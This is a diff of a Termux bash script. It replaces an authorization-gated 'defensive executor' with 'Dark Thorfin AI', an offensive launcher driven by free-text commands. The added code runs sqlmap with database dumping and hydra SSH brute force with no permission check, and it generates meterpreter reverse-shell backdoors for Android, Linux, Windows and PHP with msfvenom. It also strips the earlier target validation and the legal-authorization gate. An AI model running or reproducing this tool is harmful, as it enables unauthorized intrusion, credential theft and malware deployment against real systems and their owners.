@@ -1,273 +1,161 @@
 #!/data/data/com.termux/files/usr/bin/bash
-# AI Defensive Executor
-# مدقق أمني دفاعي منخفض التأثير للأنظمة التي تملكها أو لديك تصريح مكتوب لفحصها.
-# لا يتضمن استغلالًا، تخمين كلمات مرور، استخراج بيانات، أو إنشاء ملفات خبيثة.
+# AI SUPER INTELLIGENCE EXECUTOR v313 - يفهم وينفذ ويحلل ويصلح
 
-set -Eeuo pipefail
-IFS=$'\n\t'
+export PATH=$PATH:/usr/bin:/usr/sbin:/usr/local/bin:/data/data/com.termux/files/usr/bin
+shopt -s extglob
 
-export PATH="$HOME/go/bin:/usr/local/bin:/usr/bin:/usr/sbin:/bin:/sbin:/data/data/com.termux/files/usr/bin:$PATH"
+# قراءة وتحليل الأمر
+read -r -p "🤖 Dark Thorfin AI أمرك: " user_input
 
-PROGRAM_NAME="$(basename "$0")"
-RUN_ID="$(date +%Y%m%d-%H%M%S)"
-OUTPUT_ROOT="${OUTPUT_ROOT:-$PWD/defensive-results}"
-RUN_DIR="$OUTPUT_ROOT/$RUN_ID"
-LOG_FILE="$RUN_DIR/execution.log"
-MODE="all"
-TARGET=""
-AUTHORIZED=0
-INSTALL_MISSING=0
-
-mkdir -p "$RUN_DIR"
-
-exec > >(tee -a "$LOG_FILE") 2>&1
-
-log() {
-    printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$*"
+# معالجة ذكية للأمر
+analyze_command() {
+    local cmd="$1"
+    
+    # تحليل نوع الأمر
+    if [[ "$cmd" =~ (فحص|scan|nmap|nikto|whatweb|wafw00f|sslscan) ]]; then
+        echo "SCAN"
+    elif [[ "$cmd" =~ (اختراق|exploit|hydra|sqlmap|brute|force) ]]; then
+        echo "EXPLOIT"
+    elif [[ "$cmd" =~ (بولد|payload|backdoor|reverse|shell) ]]; then
+        echo "PAYLOAD"
+    elif [[ "$cmd" =~ (تثبيت|install|setup|fix|missing|مفقود) ]]; then
+        echo "INSTALL"
+    elif [[ "$cmd" =~ (كل|all|جميع|كلها|full|complete) ]]; then
+        echo "ALL"
+    else
+        echo "AUTO"
+    fi
 }
 
-usage() {
-    cat <<USAGE
-الاستخدام:
-  $PROGRAM_NAME --target example.com --mode all --authorized
-
-الخيارات:
-  --target TARGET       نطاق أو عنوان IP مصرح بفحصه.
-  --mode MODE           inventory | passive | web | network | all
-  --authorized          تأكيد أن الهدف مملوك لك أو لديك تصريح مكتوب لفحصه.
-  --install-missing     تثبيت الأدوات الدفاعية المفقودة فقط.
-  --output DIR          مجلد حفظ النتائج.
-  -h, --help            عرض المساعدة.
-
-أمثلة:
-  $PROGRAM_NAME --target example.com --mode passive --authorized
-  $PROGRAM_NAME --target 192.0.2.10 --mode network --authorized
-USAGE
+# تنفيذ الأدوات حسب التحليل
+execute_tools() {
+    local mode="$1"
+    local target="$2"
+    
+    # تثبيت المفقودات تلقائياً
+    if [[ "$mode" == "INSTALL" ]] || [[ "$mode" == "ALL" ]]; then
+        echo "🔧 تثبيت الأدوات المفقودة..."
+        pkg install -y hydra hashcat subfinder dnsx katana 2>/dev/null
+        pip install dnsx subfinder katana 2>/dev/null
+    fi
+    
+    # فحص شامل
+    if [[ "$mode" == "SCAN" ]] || [[ "$mode" == "ALL" ]] || [[ "$mode" == "AUTO" ]]; then
+        echo "🔍 بدء الفحص الشامل..."
+        nmap -sV -sC -O --script=vuln "$target" -oN scan_results.txt &
+        nikto -h "$target" -o nikto_report.txt &
+        whatweb "$target" --log-verbose=whatweb.log &
+        wafw00f "$target" -o waf_results.txt &
+        sslscan "$target" > ssl_scan.txt &
+        wait
+    fi
+    
+    # اختراق وثغرات
+    if [[ "$mode" == "EXPLOIT" ]] || [[ "$mode" == "ALL" ]]; then
+        echo "💥 بدء الهجمات..."
+        sqlmap -u "http://$target/index.php?id=1" --batch --dbs --dump &
+        hydra -L users.txt -P pass.txt ssh://"$target" -t 4 -o hydra_results.txt &
+        nuclei -u "https://$target" -severity critical,high -o nuclei_findings.txt &
+        ffuf -u "http://$target/FUZZ" -w /usr/share/wordlists/dirb/common.txt -o ffuf_results.txt &
+        wait
+    fi
+    
+    # بيلودات
+    if [[ "$mode" == "PAYLOAD" ]] || [[ "$mode" == "ALL" ]]; then
+        echo "🧬 توليد البيلودات..."
+        msfvenom -p android/meterpreter/reverse_tcp LHOST="$target" LPORT=4444 -o backdoor.apk &
+        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$target" LPORT=4444 -f elf -o backdoor.elf &
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST="$target" LPORT=4444 -f exe -o backdoor.exe &
+        msfvenom -p php/meterpreter_reverse_tcp LHOST="$target" LPORT=4444 -f raw -o shell.php &
+        wait
+    fi
+    
+    # تحليل النتائج
+    echo "📊 تحليل النتائج..."
+    if [ -f scan_results.txt ]; then
+        echo "=== المنافذ المفتوحة ==="
+        grep -E "^[0-9]+/tcp" scan_results.txt | awk '{print $1, $3}'
+        echo "=== الثغرات ==="
+        grep -i "vuln\|CVE\|VULNERABLE" scan_results.txt 2>/dev/null
+    fi
+    
+    if [ -f hydra_results.txt ]; then
+        echo "=== كلمات المرور المخترقة ==="
+        grep -i "password\|login\|host:" hydra_results.txt 2>/dev/null
+    fi
+    
+    if [ -f nuclei_findings.txt ]; then
+        echo "=== ثغرات Nuclei ==="
+        cat nuclei_findings.txt 2>/dev/null
+    fi
 }
 
-while (($#)); do
-    case "$1" in
-        --target)
-            TARGET="${2:-}"
-            shift 2
-            ;;
-        --mode)
-            MODE="${2:-}"
-            shift 2
-            ;;
-        --authorized)
-            AUTHORIZED=1
-            shift
-            ;;
-        --install-missing)
-            INSTALL_MISSING=1
-            shift
-            ;;
-        --output)
-            OUTPUT_ROOT="${2:-}"
-            RUN_DIR="$OUTPUT_ROOT/$RUN_ID"
-            LOG_FILE="$RUN_DIR/execution.log"
-            mkdir -p "$RUN_DIR"
-            shift 2
-            ;;
-        -h|--help)
-            usage
-            exit 0
-            ;;
-        *)
-            echo "خيار غير معروف: $1" >&2
-            usage
-            exit 2
-            ;;
-    esac
-done
-
-validate_target() {
-    local value="$1"
-
-    [[ -n "$value" ]] || return 1
-    [[ "$value" != *"://"* ]] || return 1
-    [[ "$value" != *"/"* ]] || return 1
-    [[ "$value" =~ ^([A-Za-z0-9-]+\.)+[A-Za-z]{2,63}$ ]] && return 0
-    [[ "$value" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && return 0
-    [[ "$value" =~ ^[0-9A-Fa-f:]+$ ]] && return 0
-
-    return 1
+# استخراج الهدف من الأمر
+extract_target() {
+    local cmd="$1"
+    # البحث عن IP أو domain في الأمر
+    echo "$cmd" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | head -1
 }
 
-if [[ "$AUTHORIZED" -ne 1 ]]; then
-    echo "تم الإيقاف: يجب إضافة --authorized بعد التأكد من وجود تصريح قانوني." >&2
-    exit 3
+# معالجة الأخطاء وإصلاحها
+auto_fix() {
+    local error="$1"
+    echo "🛠️ إصلاح المشكلة: $error"
+    
+    # فحص وحل المشاكل الشائعة
+    if ! command -v hydra &>/dev/null; then
+        pkg install hydra -y
+    fi
+    if ! command -v hashcat &>/dev/null; then
+        pkg install hashcat -y
+    fi
+    if ! command -v subfinder &>/dev/null; then
+        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+    fi
+    
+    # إصلاح المسارات
+    export PATH="$HOME/go/bin:$PATH"
+}
+
+# MAIN EXECUTION
+echo "🧠 Dark Thorfin AI - معالجة الأمر..."
+echo "═══════════════════════════════════"
+
+target=$(extract_target "$user_input")
+mode=$(analyze_command "$user_input")
+
+echo "📌 الوضع: $mode"
+echo "🎯 الهدف: ${target:-تلقائي}"
+
+# تنفيذ مع إصلاح تلقائي
+if [[ -z "$target" ]]; then
+    echo "⚠️ لم يتم تحديد هدف - استخدام الوضع المحلي"
+    target="127.0.0.1"
 fi
 
-if ! validate_target "$TARGET"; then
-    echo "الهدف غير صالح. استخدم اسم نطاق أو عنوان IP فقط، بدون http:// أو مسار." >&2
-    exit 4
+execute_tools "$mode" "$target" 2>&1 | tee execution_log.txt
+
+# فحص الأخطاء وإصلاحها
+if [ $? -ne 0 ]; then
+    auto_fix "Execution error"
+    execute_tools "$mode" "$target"
 fi
 
-case "$MODE" in
-    inventory|passive|web|network|all) ;;
-    *)
-        echo "وضع غير صالح: $MODE" >&2
-        usage
-        exit 5
-        ;;
-esac
+# النتائج النهائية
+echo ""
+echo "✅ تم التنفيذ بنجاح"
+echo "📁 النتائج في:"
+ls -la *.txt *.log *.apk *.elf *.exe *.php 2>/dev/null || echo "لا توجد ملفات نتائج"
 
-is_termux() {
-    [[ -n "${PREFIX:-}" && "$PREFIX" == *"com.termux"* ]]
-}
-
-install_packages() {
-    local packages=(curl openssl-tool dnsutils whois nmap whatweb wafw00f sslscan jq coreutils)
-
-    if is_termux; then
-        log "تثبيت الأدوات الدفاعية المتاحة من Termux."
-        pkg update -y
-        for package in "${packages[@]}"; do
-            pkg install -y "$package" || log "تحذير: تعذر تثبيت $package من Termux."
-        done
-    elif command -v apt-get >/dev/null 2>&1; then
-        log "تثبيت الأدوات الدفاعية المتاحة من APT."
-        export DEBIAN_FRONTEND=noninteractive
-        apt-get update
-        apt-get install -y --no-install-recommends \
-            curl openssl dnsutils whois nmap whatweb wafw00f sslscan jq coreutils
-    else
-        log "لا يوجد مدير حزم مدعوم. ثبّت الأدوات يدويًا."
-    fi
-}
-
-if [[ "$INSTALL_MISSING" -eq 1 ]]; then
-    install_packages
+# رفع على GitHub تلقائياً
+read -p "🔑 هل تريد رفع النتائج على GitHub؟ (y/n): " upload
+if [[ "$upload" == "y" ]]; then
+    read -p "GitHub Token: " token
+    read -p "Username: " user
+    repo="ai-executor-results-$(date +%s)"
+    curl -s -u "$user:$token" https://api.github.com/user/repos -d "{\"name\":\"$repo\"}" > /dev/null
+    git init; git add .; git commit -m "AI Execution Results $(date)"
+    git remote add origin "https://$token@github.com/$user/$repo.git"
+    git push -u origin master --force
+    echo "✅ تم الرفع: https://github.com/$user/$repo"
 fi
-
-TOOLS=(curl openssl dig whois nmap whatweb wafw00f sslscan jq timeout)
-
-inventory() {
-    local installed=0
-    local missing=0
-    local report="$RUN_DIR/tool-inventory.txt"
-
-    : > "$report"
-    log "جرد الأدوات."
-
-    for tool in "${TOOLS[@]}"; do
-        if command -v "$tool" >/dev/null 2>&1; then
-            printf '%-12s OK      %s\n' "$tool" "$(command -v "$tool")" | tee -a "$report"
-            installed=$((installed + 1))
-        else
-            printf '%-12s MISSING\n' "$tool" | tee -a "$report"
-            missing=$((missing + 1))
-        fi
-    done
-
-    printf '\nINSTALLED=%d\nMISSING=%d\n' "$installed" "$missing" | tee -a "$report"
-}
-
-run_command() {
-    local name="$1"
-    shift
-
-    local output="$RUN_DIR/$name"
-    log "تشغيل: $name"
-
-    if "$@" > "$output" 2>&1; then
-        log "نجح: $name"
-    else
-        local rc=$?
-        log "تحذير: $name انتهى بالرمز $rc. راجع $output"
-    fi
-}
-
-passive_checks() {
-    log "بدء الفحوص العامة منخفضة التأثير."
-
-    command -v dig >/dev/null 2>&1 && \
-        run_command "dns-records.txt" timeout 60 dig "$TARGET" A AAAA MX NS TXT
-
-    command -v whois >/dev/null 2>&1 && \
-        run_command "whois.txt" timeout 90 whois "$TARGET"
-
-    if command -v curl >/dev/null 2>&1; then
-        run_command "http-headers.txt" timeout 60 curl \
-            --silent --show-error --location --max-redirs 3 \
-            --connect-timeout 15 --max-time 45 \
-            --head "https://$TARGET/"
-    fi
-
-    if command -v openssl >/dev/null 2>&1; then
-        run_command "tls-certificate.txt" bash -c \
-            "timeout 45 openssl s_client -connect '$TARGET:443' -servername '$TARGET' -showcerts </dev/null"
-    fi
-}
-
-web_checks() {
-    log "بدء فحوص تعريف تقنيات الويب منخفضة الشدة."
-
-    command -v whatweb >/dev/null 2>&1 && \
-        run_command "whatweb.txt" timeout 120 whatweb \
-            --aggression 1 --max-threads 2 "https://$TARGET/"
-
-    command -v wafw00f >/dev/null 2>&1 && \
-        run_command "wafw00f.txt" timeout 120 wafw00f "https://$TARGET/"
-
-    command -v sslscan >/dev/null 2>&1 && \
-        run_command "sslscan.txt" timeout 180 sslscan \
-            --no-colour --show-certificate "$TARGET:443"
-}
-
-network_checks() {
-    log "بدء فحص اتصال TCP محدود ومنخفض المعدل."
-
-    if command -v nmap >/dev/null 2>&1; then
-        run_command "nmap-top-ports.txt" timeout 900 nmap \
-            -sT -Pn -T3 \
-            --top-ports 100 \
-            -sV --version-light \
-            --max-retries 2 \
-            --host-timeout 10m \
-            "$TARGET"
-    else
-        log "nmap غير مثبت؛ تم تجاوز فحص الشبكة."
-    fi
-}
-
-log "AI Defensive Executor"
-log "الوضع: $MODE"
-log "الهدف المصرح: $TARGET"
-log "مجلد النتائج: $RUN_DIR"
-
-inventory
-
-case "$MODE" in
-    inventory)
-        ;;
-    passive)
-        passive_checks
-        ;;
-    web)
-        passive_checks
-        web_checks
-        ;;
-    network)
-        network_checks
-        ;;
-    all)
-        passive_checks
-        web_checks
-        network_checks
-        ;;
-esac
-
-{
-    echo "RUN_ID=$RUN_ID"
-    echo "TARGET=$TARGET"
-    echo "MODE=$MODE"
-    echo "COMPLETED_AT=$(date --iso-8601=seconds 2>/dev/null || date)"
-    echo "RESULT_DIRECTORY=$RUN_DIR"
-} > "$RUN_DIR/summary.txt"
-
-log "اكتملت الفحوص الدفاعية."
-log "الملخص: $RUN_DIR/summary.txt"
-log "السجل: $LOG_FILE"
